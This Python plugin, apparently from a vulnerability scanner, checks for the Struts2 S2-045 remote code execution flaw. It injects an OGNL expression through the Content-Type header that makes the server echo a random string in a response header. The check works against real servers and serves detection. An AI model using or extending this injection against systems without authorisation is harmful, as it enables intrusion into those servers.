#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    url = '{}://{}:{}/'.format(service, ip, port)
    payload = random_str(8)

    ct = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Security',"
    ct += "'%s'" % payload
    ct += ")}.multipart/form-data"

    try:
        r = await http_client(ip, port).get(url, headers={'Content-Type': ct}, timeout=20)

        if 'X-Security' in r.headers and r.headers['X-Security'] == payload:
            ret = {
                'alert_group': 'Struts2 s02-45 RCE',
                'affects': url,
                'details': 'with content-type:[\n{ct}\n] to request Url, '
                           'return the header of response: [\n{rh}\n]'.format(ct=ct, rh=r.headers)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
